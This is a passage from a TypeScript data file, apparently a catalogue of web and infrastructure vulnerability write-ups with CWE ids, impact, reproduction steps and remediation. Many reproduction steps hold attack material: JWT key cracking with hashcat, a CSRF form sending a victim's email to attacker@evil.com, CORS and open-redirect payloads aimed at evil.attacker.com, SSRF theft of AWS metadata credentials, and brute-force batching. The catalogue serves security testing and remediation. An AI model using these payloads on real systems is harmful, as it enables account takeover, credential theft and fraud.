    impact:"Attacker can forge any JWT token with arbitrary claims, achieving full authentication bypass and privilege escalation.",
    steps_to_reproduce:"1. Capture a valid JWT token.\n2. Run: hashcat -a 0 -m 16500 token.txt wordlist.txt\n3. Or: john --wordlist=rockyou.txt --format=HMAC-SHA256 token.txt\n4. Once key recovered, forge tokens with admin privileges.",
    remediation:"Use cryptographically random secret keys of at least 256 bits. Use asymmetric keys (RS256, ES256) for production. Store keys in key management systems. Rotate keys periodically.",
    references:["https://portswigger.net/web-security/jwt","https://cwe.mitre.org/data/definitions/326.html"],
    tags:["JWT","weak key","brute-force","authentication","critical"],
  },
  {
    id:"wup-092",title:"JWT – Missing Expiry Validation",category:"JWT",severity:"Medium",cvss_score:6.5,
    cwe_id:"CWE-613",owasp:"A07:2021",
    description:"JWT tokens are issued without an expiry claim (exp) or the application fails to validate the expiry, resulting in tokens that are valid indefinitely.",
    impact:"Stolen tokens remain valid forever, extending the window of opportunity for session hijacking.",
    steps_to_reproduce:"1. Obtain a JWT token and decode the payload.\n2. Observe missing 'exp' claim, or very long expiry (years in the future).\n3. Or: modify exp claim to a past date and verify the token is still accepted.",
    remediation:"Always set and validate the 'exp' claim. Set short expiry times (15 min for access tokens). Implement refresh token rotation. Maintain a token revocation list for critical operations.",
    references:["https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/","https://cwe.mitre.org/data/definitions/613.html"],
    tags:["JWT","expiry","session","token"],
  },
  // ── CSRF ─────────────────────────────────────────────────────────────────────
  {
    id:"wup-100",title:"Cross-Site Request Forgery (CSRF)",category:"CSRF",severity:"High",cvss_score:8.0,
    cwe_id:"CWE-352",owasp:"A01:2021",
    description:"The application performs sensitive state-changing actions using cookies for authentication without verifying that the request originated from the legitimate application, allowing cross-origin requests to be forged.",
    impact:"Attacker can force authenticated users to perform actions without their knowledge: change email/password, make purchases, transfer funds, modify settings.",
    steps_to_reproduce:'1. Identify state-changing endpoints that rely solely on cookies.\n2. Create a HTML page:\n   <form action="https://target.com/api/change-email" method="POST">\n     <input name="email" value="attacker@evil.com"/>\n   </form>\n   <script>document.forms[0].submit()</script>\n3. Host page and get victim to visit.',
    remediation:"Implement CSRF tokens on all state-changing forms. Use SameSite=Strict or SameSite=Lax cookie attribute. Verify Origin/Referer headers. Use custom request headers for AJAX (X-Requested-With).",
    references:["https://owasp.org/www-community/attacks/csrf","https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/352.html"],
    tags:["CSRF","OWASP Top 10","CWE Top 25","state-changing","forged request"],
  },
  // ── HTTP HEADERS ─────────────────────────────────────────────────────────────
  {
    id:"wup-110",title:"Missing Content Security Policy (CSP)",category:"HTTP Headers",severity:"Medium",cvss_score:5.4,
    cwe_id:"CWE-693",owasp:"A05:2021",
    description:"The application does not implement a Content Security Policy header, removing a critical defence-in-depth control against XSS and data injection attacks.",
    impact:"Without CSP, successful XSS attacks can freely exfiltrate data to external origins and execute arbitrary scripts without restriction.",
    steps_to_reproduce:"1. Check response headers: curl -I https://target.com\n2. Observe absence of Content-Security-Policy header.",
    remediation:"Implement CSP: Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none'; base-uri 'self'. Start with report-only mode. Avoid unsafe-inline and unsafe-eval.",
    references:["https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP","https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html","https://csp-evaluator.withgoogle.com/"],
    tags:["CSP","HTTP headers","XSS defence","browser security"],
  },
  {
    id:"wup-111",title:"Missing HTTP Strict Transport Security (HSTS)",category:"HTTP Headers",severity:"Medium",cvss_score:5.9,
    cwe_id:"CWE-319",owasp:"A02:2021",
    description:"The application does not include the Strict-Transport-Security header, leaving users vulnerable to protocol downgrade attacks and SSL stripping.",
    impact:"SSL stripping attacks can force connections over HTTP, exposing session cookies and sensitive data. Users who access the site over HTTP are not automatically redirected to HTTPS.",
    steps_to_reproduce:"1. Request HTTP version of site: curl -I http://target.com\n2. Check HTTPS response for HSTS: curl -I https://target.com | grep -i strict",
    remediation:"Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. Redirect all HTTP traffic to HTTPS. Register domain on HSTS preload list (https://hstspreload.org/).",
    references:["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security","https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html"],
    tags:["HSTS","HTTP headers","TLS","SSL stripping"],
  },
  {
    id:"wup-112",title:"Missing X-Frame-Options / Clickjacking",category:"Clickjacking",severity:"Medium",cvss_score:4.3,
    cwe_id:"CWE-1021",owasp:"A05:2021",
    description:"The application does not prevent its pages from being embedded in iframes, allowing clickjacking attacks where a victim is tricked into clicking on hidden UI elements.",
    impact:"User actions unknowingly performed: changing account settings, making purchases, clicking hidden buttons, sharing content.",
    steps_to_reproduce:'1. Check headers: curl -I https://target.com | grep -i "x-frame\|frame-ancestors"\n2. Create PoC: <iframe src="https://target.com/sensitive-action" style="opacity:0"></iframe>',
    remediation:"Add: X-Frame-Options: DENY or SAMEORIGIN. Or use CSP: frame-ancestors 'none'. X-Frame-Options is simpler; CSP frame-ancestors is more flexible and the modern approach.",
    references:["https://owasp.org/www-community/attacks/Clickjacking","https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/1021.html"],
    tags:["clickjacking","X-Frame-Options","iframe","HTTP headers"],
  },
  {
    id:"wup-113",title:"Missing X-Content-Type-Options",category:"HTTP Headers",severity:"Low",cvss_score:3.7,
    cwe_id:"CWE-116",owasp:"A05:2021",
    description:"The X-Content-Type-Options: nosniff header is absent, allowing browsers to MIME-type sniff responses and potentially execute uploaded files as scripts.",
    impact:"Browser MIME type sniffing could cause uploaded content-type (e.g. HTML in an image upload) to be executed as HTML, potentially enabling XSS.",
    steps_to_reproduce:"1. Check: curl -I https://target.com | grep -i x-content-type\n2. Upload an HTML file as an image and verify if browser renders it.",
    remediation:"Add header: X-Content-Type-Options: nosniff to all responses. Ensure Content-Type headers are set correctly for all resources.",
    references:["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options","https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html"],
    tags:["HTTP headers","MIME sniffing","nosniff"],
  },
  // ── CORS ─────────────────────────────────────────────────────────────────────
  {
    id:"wup-120",title:"Overly Permissive CORS Policy",category:"CORS",severity:"High",cvss_score:8.1,
    cwe_id:"CWE-942",owasp:"A05:2021",
    description:"The application reflects the Origin header or uses a wildcard (*) CORS policy in conjunction with credentials, allowing unauthorised cross-origin requests from attacker-controlled sites.",
    impact:"Authenticated API requests made from attacker's website on behalf of logged-in users, reading sensitive data from the API.",
    steps_to_reproduce:"1. Send: Origin: https://evil.attacker.com in request.\n2. Check response: Access-Control-Allow-Origin: https://evil.attacker.com (reflected) or *\n3. Check for: Access-Control-Allow-Credentials: true\n4. PoC: fetch('https://target.com/api/profile', {credentials:'include'}).then(r=>r.json()).then(console.log)",
    remediation:"Implement strict CORS allowlist. Never reflect the Origin header without validation. Do not combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true. Define explicit allowed origins.",
    references:["https://portswigger.net/web-security/cors","https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html#cors","https://cwe.mitre.org/data/definitions/942.html"],
    tags:["CORS","cross-origin","API","credentials"],
  },
  // ── OPEN REDIRECT ─────────────────────────────────────────────────────────────
  {
    id:"wup-130",title:"Open Redirect",category:"Open Redirect",severity:"Medium",cvss_score:6.1,
    cwe_id:"CWE-601",owasp:"A01:2021",
    description:"The application redirects users to a URL specified in a user-controlled parameter without validating the destination, enabling phishing and credential theft via trusted-looking redirect URLs.",
    impact:"Phishing attacks using trusted domain as redirect origin. OAuth token theft via redirect URIs. Reputation damage.",
    steps_to_reproduce:"1. Find redirect parameters: ?redirect=, ?next=, ?url=, ?return=\n2. Test: ?redirect=https://evil.attacker.com\n3. Or encoded: ?redirect=%68%74%74%70%73%3A%2F%2Fattacker.com",
    remediation:"Implement an allowlist of permitted redirect destinations. If dynamic redirects are required, use redirect tokens (signed opaque references). Validate and reject external URLs. Show a redirect warning page for external links.",
    references:["https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/601.html"],
    tags:["open redirect","phishing","redirect","URL validation"],
  },
  // ── TLS / SSL ─────────────────────────────────────────────────────────────────
  {
    id:"wup-140",title:"Deprecated TLS Version Support (TLS 1.0/1.1)",category:"TLS / SSL",severity:"Medium",cvss_score:5.9,
    cwe_id:"CWE-326",owasp:"A02:2021",
    description:"The server supports deprecated TLS versions (1.0 or 1.1) which are known to have cryptographic weaknesses including BEAST, POODLE, and CRIME attacks.",
    impact:"Man-in-the-middle attacks against sessions using deprecated TLS versions. Potential for session decryption.",
    steps_to_reproduce:"1. Test: nmap --script ssl-enum-ciphers -p 443 target.com\n2. Or: testssl.sh target.com\n3. Observe TLS 1.0/1.1 being offered.",
    remediation:"Disable TLS 1.0 and TLS 1.1. Support only TLS 1.2 and TLS 1.3. Configure server to prefer forward secrecy cipher suites (ECDHE). Use Mozilla's TLS configuration generator.",
    references:["https://wiki.mozilla.org/Security/Server_Side_TLS","https://www.ssllabs.com/ssltest/","https://cwe.mitre.org/data/definitions/326.html"],
    tags:["TLS","SSL","deprecated","POODLE","BEAST"],
  },
  {
    id:"wup-141",title:"SSL Certificate – Self-Signed",category:"TLS / SSL",severity:"Medium",cvss_score:5.9,
    cwe_id:"CWE-295",owasp:"A02:2021",
    description:"The server presents a self-signed SSL/TLS certificate that cannot be validated by a trusted certificate authority, enabling man-in-the-middle attacks.",
    impact:"Clients that accept the certificate are vulnerable to MITM attacks. Credentials and session tokens can be intercepted.",
    steps_to_reproduce:"1. Access the application and observe browser certificate warning.\n2. Or: openssl s_client -connect target.com:443 | grep -A2 'issuer'",
    remediation:"Obtain and install a certificate from a trusted CA (Let's Encrypt, DigiCert, etc.). Set up automatic certificate renewal. Implement HSTS to prevent downgrade attacks.",
    references:["https://letsencrypt.org/","https://cwe.mitre.org/data/definitions/295.html"],
    tags:["TLS","certificate","self-signed","MITM"],
  },
  {
    id:"wup-142",title:"Weak SSL/TLS Cipher Suites",category:"TLS / SSL",severity:"Medium",cvss_score:5.9,
    cwe_id:"CWE-327",owasp:"A02:2021",
    description:"The server supports weak cipher suites including NULL encryption, anonymous ciphers, RC4, DES, 3DES, or export-grade ciphers.",
    impact:"Decryption of traffic for connections using weak ciphers. Attackers can downgrade negotiated cipher suites.",
    steps_to_reproduce:"1. testssl.sh --each-cipher target.com\n2. Or: nmap --script ssl-enum-ciphers target.com\n3. Identify weak/NULL/export ciphers in output.",
    remediation:"Disable weak cipher suites. Configure only AEAD ciphers (AES-GCM, ChaCha20-Poly1305). Enable forward secrecy (ECDHE). Use Mozilla SSL Configuration Generator for server configs.",
    references:["https://wiki.mozilla.org/Security/Server_Side_TLS","https://cipherlist.eu/","https://cwe.mitre.org/data/definitions/327.html"],
    tags:["TLS","cipher suites","weak encryption","RC4","DES"],
  },
  // ── API SECURITY ─────────────────────────────────────────────────────────────
  {
    id:"wup-150",title:"API – No Rate Limiting",category:"API Security",severity:"High",cvss_score:7.5,
    cwe_id:"CWE-770",owasp:"A04:2021",
    description:"The API does not implement rate limiting, allowing unlimited requests and enabling brute-force attacks, credential stuffing, data scraping, and denial of service.",
    impact:"Account compromise via credential stuffing, mass data exfiltration via scraping, DoS by flooding API endpoints.",
    steps_to_reproduce:"1. Send 100+ rapid requests to authentication or sensitive endpoints.\n2. Observe no throttling, lockout, or 429 responses.\n3. Use: for i in $(seq 1 100); do curl -s -o /dev/null -w \"%{http_code}\\n\" https://api.target.com/login; done",
    remediation:"Implement rate limiting per IP and per account. Return 429 Too Many Requests with Retry-After header. Implement progressive delays. Use API gateway with built-in rate limiting. Implement CAPTCHA for high-value endpoints.",
    references:["https://owasp.org/www-project-api-security/","https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/770.html"],
    tags:["API","rate limiting","brute-force","OWASP API Top 10"],
  },
  {
    id:"wup-151",title:"API – Excessive Data Exposure",category:"API Security",severity:"High",cvss_score:7.5,
    cwe_id:"CWE-213",owasp:"A03:2021",
    description:"The API returns more data than required by the client, including sensitive fields that the application filters in the UI but transmits in the response.",
    impact:"Exposure of PII, internal system data, credentials, or other sensitive information not visible in the UI.",
    steps_to_reproduce:"1. Intercept API responses with Burp Suite.\n2. Compare raw API response data with what is displayed in the UI.\n3. Document fields returned but not displayed: passwords, tokens, internal IDs, PII.",
    remediation:"Implement response filtering at the API layer. Never rely on client-side filtering. Use API-specific DTOs/ViewModels. Apply field-level access controls. Conduct data minimisation reviews.",
    references:["https://owasp.org/www-project-api-security/","https://cwe.mitre.org/data/definitions/213.html"],
    tags:["API","data exposure","OWASP API Top 10","PII"],
  },
  {
    id:"wup-152",title:"Broken Object Level Authorization (BOLA)",category:"API Security",severity:"Critical",cvss_score:9.1,
    cwe_id:"CWE-639",owasp:"A01:2021",
    description:"API endpoints that receive an object ID as a parameter fail to verify that the authenticated user is authorised to access the specific object, equivalent to IDOR in API context.",
    impact:"Unauthorised access to other users' data, account takeover, sensitive data exfiltration at scale.",
    steps_to_reproduce:"1. Identify API endpoints with object identifiers: GET /api/orders/{orderId}\n2. Enumerate IDs and access orders belonging to other users.\n3. Document unauthorised data access.",
    remediation:"Implement object-level authorisation on every endpoint. Verify requesting user owns or has access to each object. Use UUIDs to prevent enumeration but still validate ownership. This is OWASP API Security #1.",
    references:["https://owasp.org/www-project-api-security/","https://cwe.mitre.org/data/definitions/639.html"],
    tags:["BOLA","IDOR","API","authorisation","OWASP API Top 10","critical"],
  },
  // ── SECURITY MISCONFIGURATION ─────────────────────────────────────────────────
  {
    id:"wup-160",title:"Debug Mode Enabled in Production",category:"Security Misconfiguration",severity:"High",cvss_score:7.5,
    cwe_id:"CWE-489",owasp:"A05:2021",
    description:"The application is running with debug mode enabled in a production environment, exposing detailed error information, source code snippets, and internal configuration.",
    impact:"Disclosure of source code, configuration values, environment variables, database credentials, and internal file paths.",
    steps_to_reproduce:"1. Trigger an error by sending malformed requests.\n2. Observe: Django debug page, Rails error output, PHP Whoops page\n3. Review exposed configuration data and source code.",
    remediation:"Set DEBUG=False in production. Configure custom error pages. Separate development and production configurations. Use environment-specific configuration management.",
    references:["https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration","https://cwe.mitre.org/data/definitions/489.html"],
    tags:["debug mode","misconfiguration","information disclosure","production"],
  },
  {
    id:"wup-161",title:"Directory Listing Enabled",category:"Security Misconfiguration",severity:"Medium",cvss_score:5.3,
    cwe_id:"CWE-548",owasp:"A05:2021",
    description:"The web server has directory listing enabled, allowing unauthenticated browsing of directory contents and discovery of sensitive files.",
    impact:"Disclosure of file structure, source code, backup files, configuration files, and other sensitive content not intended for public access.",
    steps_to_reproduce:"1. Access directories: /uploads/, /backup/, /static/, /images/\n2. Observe HTML listing of directory contents.\n3. Navigate to and download sensitive files.",
    remediation:"Disable directory listing (Options -Indexes for Apache, autoindex off for Nginx). Configure web server to return 403 for directories without index files. Audit web root for sensitive file exposure.",
    references:["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission","https://cwe.mitre.org/data/definitions/548.html"],
    tags:["directory listing","misconfiguration","file exposure"],
  },
  // ── CLOUD ─────────────────────────────────────────────────────────────────────
  {
    id:"wup-170",title:"AWS S3 Bucket – Publicly Accessible",category:"Cloud",severity:"Critical",cvss_score:9.8,
    cwe_id:"CWE-284",owasp:"A01:2021",
    description:"An AWS S3 bucket is configured with public read or write permissions, allowing unauthenticated access to bucket contents.",
    impact:"Full exfiltration of bucket contents (may include PII, credentials, backups). If write-enabled: data tampering, malware hosting, cost abuse.",
    steps_to_reproduce:"1. Enumerate buckets: https://target.s3.amazonaws.com, https://s3.amazonaws.com/target\n2. aws s3 ls s3://target-bucket --no-sign-request\n3. Check: aws s3 sync s3://target-bucket ./output --no-sign-request",
    remediation:"Block all public access at account level via S3 Block Public Access. Set explicit bucket policies denying public access. Enable S3 access logging. Use S3 Access Analyzer to audit permissions. Encrypt all bucket contents.",
    references:["https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html","https://cwe.mitre.org/data/definitions/284.html"],
    tags:["AWS","S3","cloud","public access","critical"],
  },
  {
    id:"wup-171",title:"AWS IMDSv1 – SSRF to Metadata Service",category:"Cloud",severity:"Critical",cvss_score:9.1,
    cwe_id:"CWE-918",owasp:"A10:2021",
    description:"An SSRF vulnerability combined with IMDSv1 (no token required) allows retrieval of EC2 instance metadata including temporary IAM credentials.",
    impact:"Full AWS account compromise via retrieved IAM credentials. Lateral movement to all AWS resources accessible by the instance role.",
    steps_to_reproduce:"1. Exploit SSRF to request: http://169.254.169.254/latest/meta-data/\n2. Enumerate: /latest/meta-data/iam/security-credentials/\n3. Read credentials: /latest/meta-data/iam/security-credentials/{role-name}\n4. Use returned AccessKeyId, SecretAccessKey, Token for AWS API calls.",
    remediation:"Enforce IMDSv2 (token-required mode) on all EC2 instances. Apply minimum privilege IAM roles. Implement SSRF prevention controls. Audit all internet-facing applications for SSRF.",
    references:["https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html","https://cwe.mitre.org/data/definitions/918.html"],
    tags:["AWS","IMDS","cloud","SSRF","credentials","critical"],
  },
  // ── OAUTH ─────────────────────────────────────────────────────────────────────
  {
    id:"wup-180",title:"OAuth – State Parameter Missing (CSRF)",category:"OAuth",severity:"High",cvss_score:8.1,
    cwe_id:"CWE-352",owasp:"A07:2021",
    description:"The OAuth 2.0 implementation does not use or validate the state parameter, leaving the OAuth flow vulnerable to CSRF attacks that can link a victim's account to an attacker's OAuth identity.",
    impact:"Account takeover via CSRF: attacker initiates OAuth flow, captures the authorisation code URL, tricks victim into completing it, linking attacker's OAuth account to victim's account.",
    steps_to_reproduce:"1. Initiate OAuth login and observe absence of state parameter in authorisation URL.\n2. Or: modify state parameter and verify it is not validated.\n3. Craft CSRF PoC to force victim through OAuth flow.",
    remediation:"Generate a cryptographically random state parameter for every OAuth request. Store state in session. Verify state on callback. Reject requests with missing or invalid state parameters.",
    references:["https://datatracker.ietf.org/doc/html/rfc6749#section-10.12","https://portswigger.net/web-security/oauth","https://cwe.mitre.org/data/definitions/352.html"],
    tags:["OAuth","CSRF","state parameter","account takeover"],
  },
  // ── GRAPHQL ───────────────────────────────────────────────────────────────────
  {
    id:"wup-190",title:"GraphQL – Introspection Enabled in Production",category:"GraphQL",severity:"Medium",cvss_score:5.3,
    cwe_id:"CWE-200",owasp:"A05:2021",
    description:"GraphQL introspection is enabled in production, allowing unauthenticated enumeration of the full API schema including all types, queries, mutations, and fields.",
    impact:"Attackers gain full knowledge of the API surface, enabling targeted attacks against all endpoints without prior knowledge.",
    steps_to_reproduce:'1. Send introspection query:\n   {"query":"{__schema{types{name fields{name}}}}"}\n2. Observe full schema returned.',
    remediation:"Disable introspection in production environments. If required for tooling, restrict to authenticated admin users. Use persisted queries to limit query flexibility.",
    references:["https://graphql.org/learn/introspection/","https://owasp.org/www-project-web-security-testing-guide/"],
    tags:["GraphQL","introspection","API","schema disclosure"],
  },
  {
    id:"wup-191",title:"GraphQL – Batching Attack / Denial of Service",category:"GraphQL",severity:"High",cvss_score:7.5,
    cwe_id:"CWE-400",owasp:"A04:2021",
    description:"GraphQL allows query batching which can be abused to bypass rate limiting or exhaust server resources by sending hundreds of operations in a single HTTP request.",
    impact:"Rate limit bypass enabling brute-force of authentication. Server resource exhaustion causing denial of service.",
    steps_to_reproduce:'1. Batch multiple login mutations in one request:\n   [{"query":"mutation{login(username:\\"admin\\",password:\\"pass1\\")}"},\n    {"query":"mutation{login(username:\\"admin\\",password:\\"pass2\\")}"},...]\n2. Send 100+ batched requests and observe no rate limiting.',
    remediation:"Limit query depth and complexity. Disable or restrict query batching. Apply per-query rate limiting, not per-HTTP-request. Implement query cost analysis.",
    references:["https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/400.html"],
    tags:["GraphQL","batching","rate limit bypass","DoS"],
  },
  // ── WEBSOCKET ─────────────────────────────────────────────────────────────────
  {
    id:"wup-200",title:"WebSocket – Missing Origin Validation",category:"WebSocket",severity:"High",cvss_score:8.1,
    cwe_id:"CWE-346",owasp:"A07:2021",
    description:"The WebSocket server accepts connections from any origin without validating the Origin header, enabling Cross-Site WebSocket Hijacking (CSWSH).",
    impact:"Attacker can establish WebSocket connections on behalf of authenticated victims from a malicious page, reading real-time data or performing authenticated actions.",
    steps_to_reproduce:"1. Connect to WebSocket from a different origin via browser console.\n2. Or intercept WebSocket upgrade and change Origin header.\n3. Observe connection is accepted and data is returned.",
    remediation:"Validate the Origin header against an allowlist of permitted origins. Implement CSRF tokens for WebSocket connections. Require authentication tokens in WebSocket handshake.",
    references:["https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking","https://cwe.mitre.org/data/definitions/346.html"],
    tags:["WebSocket","CSWSH","origin validation","CSRF"],
  },
  // ── RACE CONDITION ────────────────────────────────────────────────────────────
  {
    id:"wup-210",title:"Race Condition – Double Spend / Limit Bypass",category:"Race Condition",severity:"High",cvss_score:8.1,
    cwe_id:"CWE-362",owasp:"A04:2021",
    description:"The application performs multi-step operations (check-then-act) without proper locking, allowing concurrent requests to bypass business logic controls.",
    impact:"Financial fraud (redeeming coupons multiple times), limit bypass (exceeding usage caps), duplicate resource creation.",
    steps_to_reproduce:"1. Identify single-use operations: coupon redemption, vote, withdraw.\n2. Send 10+ simultaneous requests using Burp Intruder/Turbo Intruder.\n3. Observe multiple successful redemptions.",
    remediation:"Use database transactions with appropriate isolation levels. Implement database-level locks. Use idempotency keys. Implement atomic operations for critical business logic. Test with load testing tools.",
    references:["https://portswigger.net/web-security/race-conditions","https://cwe.mitre.org/data/definitions/362.html"],
    tags:["race condition","business logic","concurrency","TOCTOU"],
  },
  // ── MOBILE ────────────────────────────────────────────────────────────────────
  {
    id:"wup-220",title:"Android – Cleartext Traffic",category:"Mobile",severity:"High",cvss_score:7.4,
    cwe_id:"CWE-319",owasp:"A09:2021",
    description:"The Android application sends sensitive data over unencrypted HTTP connections, exposing credentials, session tokens, and personal data to network eavesdroppers.",
    impact:"Network-level attackers (coffee shop WiFi, corporate network) can capture all transmitted data.",
    steps_to_reproduce:"1. Configure proxy (Burp/MitMProxy).\n2. Install CA cert on device.\n3. Intercept traffic and observe HTTP (not HTTPS) requests containing sensitive data.",
    remediation:"Enforce HTTPS for all network communication. Implement Network Security Configuration to prevent cleartext traffic. Pin certificates for sensitive communications. Set android:usesCleartextTraffic=\"false\".",
    references:["https://developer.android.com/training/articles/security-config","https://mas.owasp.org/MASTG/","https://cwe.mitre.org/data/definitions/319.html"],
    tags:["mobile","Android","cleartext","HTTP","network security"],
  },
  {
    id:"wup-221",title:"iOS – Insecure Data Storage in NSUserDefaults",category:"Mobile",severity:"Medium",cvss_score:6.2,
    cwe_id:"CWE-312",owasp:"A02:2021",
    description:"The iOS application stores sensitive data (auth tokens, PII, passwords) in NSUserDefaults or unprotected files, accessible without device encryption.",
    impact:"Physical access or backup extraction can reveal sensitive user data. Jailbroken devices allow any app to read NSUserDefaults.",
    steps_to_reproduce:"1. On jailbroken device: open /var/mobile/Containers/Data/Application/{UUID}/Library/Preferences/{bundle-id}.plist\n2. Or extract iOS backup and inspect plist files.",
    remediation:"Use iOS Keychain for sensitive data. Enable appropriate data protection classes (NSFileProtectionComplete). Encrypt sensitive data before storing. Do not store credentials or tokens in UserDefaults or plain files.",
    references:["https://developer.apple.com/documentation/security/keychain_services","https://mas.owasp.org/MASTG/","https://cwe.mitre.org/data/definitions/312.html"],
    tags:["mobile","iOS","NSUserDefaults","insecure storage","Keychain"],
  },
  // ── INFRASTRUCTURE ────────────────────────────────────────────────────────────
  {
    id:"wup-230",title:"SSH – Root Login Permitted",category:"Infrastructure",severity:"High",cvss_score:7.5,
    cwe_id:"CWE-250",owasp:"A05:2021",
    description:"The SSH server is configured to permit direct root login, allowing brute-force attacks to directly target the highest-privilege account.",
    impact:"Successful authentication gives immediate root access. No privilege escalation step required after compromising credentials.",
    steps_to_reproduce:"1. Check sshd configuration: PermitRootLogin yes\n2. Or attempt: ssh root@target.com\n3. Observe whether connection is permitted (not denied at auth stage).",
    remediation:"Set PermitRootLogin no in /etc/ssh/sshd_config. Require sudo for privilege elevation from a non-root account. Disable password authentication, use key-based auth only. Implement fail2ban.",
    references:["https://www.ssh.com/academy/ssh/sshd_config","https://cwe.mitre.org/data/definitions/250.html"],
    tags:["SSH","infrastructure","root login","Linux"],
  },
  {
    id:"wup-231",title:"Unnecessary Open Ports / Services",category:"Infrastructure",severity:"Medium",cvss_score:5.3,
    cwe_id:"CWE-16",owasp:"A05:2021",
    description:"The server exposes unnecessary services and open ports that increase the attack surface and provide potential vectors for exploitation.",
    impact:"Each unnecessary service represents an additional attack vector. Unpatched or misconfigured services can be directly exploited.",
    steps_to_reproduce:"1. nmap -sV -sC -p- target.com\n2. Identify unexpected open ports: database ports (3306, 5432), admin panels (8080, 8443), debug endpoints\n3. Verify whether services should be publicly accessible.",
    remediation:"Apply principle of minimal services. Firewall all non-essential ports. Run internal services on localhost only. Regularly audit exposed services. Remove or disable unused services.",
    references:["https://owasp.org/www-project-web-security-testing-guide/","https://cwe.mitre.org/data/definitions/16.html"],
    tags:["infrastructure","open ports","attack surface","nmap"],
  },
  // ── BUSINESS LOGIC ────────────────────────────────────────────────────────────
  {
    id:"wup-240",title:"Negative Price / Quantity Manipulation",category:"Business Logic",severity:"Critical",cvss_score:9.1,
    cwe_id:"CWE-840",owasp:"A04:2021",
    description:"The application fails to validate that price or quantity values are positive, allowing manipulation of these fields to create negative totals, resulting in store credit or free/paid items.",
    impact:"Financial loss. Attacker can purchase items for free or receive credits/refunds without legitimate basis.",
    steps_to_reproduce:"1. Add item to cart.\n2. Intercept checkout request.\n3. Modify quantity to: -1, or price to: -99.99\n4. Observe whether total is reduced or credit applied.",
    remediation:"Validate all numeric inputs server-side. Enforce minimum values (quantity >= 1, price > 0). Re-calculate totals server-side using server-stored prices. Never trust client-supplied price or total values.",
    references:["https://portswigger.net/web-security/logic-flaws","https://cwe.mitre.org/data/definitions/840.html"],
    tags:["business logic","price manipulation","e-commerce","negative value"],
  },
  {
    id:"wup-241",title:"Password Reset – Insecure Token",category:"Business Logic",severity:"High",cvss_score:8.8,
    cwe_id:"CWE-640",owasp:"A07:2021",
    description:"The password reset mechanism uses weak, predictable, or insufficiently long tokens that can be guessed or brute-forced.",
    impact:"Account takeover of any user by guessing/brute-forcing their reset token.",
    steps_to_reproduce:"1. Initiate password reset and capture token.\n2. Analyse token structure: timestamp-based, sequential, short length.\n3. Or: request multiple tokens and identify patterns.\n4. Test: brute-force short tokens with Burp Intruder.",
    remediation:"Use cryptographically random tokens of at least 128 bits. Set short expiry (15 minutes). Invalidate token after single use. Invalidate all existing tokens when new one is requested.",
    references:["https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html","https://cwe.mitre.org/data/definitions/640.html"],
    tags:["password reset","authentication","token","brute-force"],
  },
  // ── NETWORK ───────────────────────────────────────────────────────────────────
  {
    id:"wup-250",title:"DNS Zone Transfer",category:"DNS",severity:"Medium",cvss_score:5.3,
    cwe_id:"CWE-200",owasp:"A05:2021",
    description:"The DNS server allows unauthorised zone transfers, exposing the complete DNS zone data including all subdomain names, IP addresses, and mail server configurations.",
    impact:"Complete enumeration of internal network topology, discovery of internal hostnames, server IPs, and potential internal services.",
    steps_to_reproduce:"1. dig axfr @ns1.target.com target.com\n2. Or: host -l target.com ns1.target.com\n3. Observe complete zone transfer response.",
    remediation:"Restrict zone transfers to authorised secondary DNS servers only. Configure TSIG (Transaction Signature) authentication for zone transfers. Audit ACLs on DNS server.",
    references:["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover","https://cwe.mitre.org/data/definitions/200.html"],
    tags:["DNS","zone transfer","information disclosure","network"],
  },
  {
    id:"wup-251",title:"SNMP – Default Community String",category:"Network",severity:"High",cvss_score:7.5,
    cwe_id:"CWE-1392",owasp:"A05:2021",
    description:"Network devices expose SNMP with default community strings (public, private), allowing unauthenticated read/write access to device configuration and sensitive network data.",
    impact:"Full disclosure of network configuration, routing tables, device information. If write access: device reconfiguration.",
    steps_to_reproduce:"1. snmpwalk -v 2c -c public target.com\n2. Or: nmap -sU -p 161 --script snmp-info target.com\n3. Enumerate MIB data with default community string.",
    remediation:"Change default community strings to complex values. Migrate to SNMPv3 with authentication and encryption. Restrict SNMP to management networks via ACLs. Disable SNMP if not needed.",
    references:["https://owasp.org/www-project-web-security-testing-guide/","https://cwe.mitre.org/data/definitions/1392.html"],
    tags:["SNMP","network","default credentials","infrastructure"],
  },
];

export function searchWriteups(query: string): Writeup[] {
  if (!query.trim()) return WRITEUPS_DB;
  const q = query.toLowerCase();
  return WRITEUPS_DB.filter(w =>
    w.title.toLowerCase().includes(q) ||
    w.category.toLowerCase().includes(q) ||
    w.cwe_id.toLowerCase().includes(q) ||
    w.owasp.toLowerCase().includes(q) ||
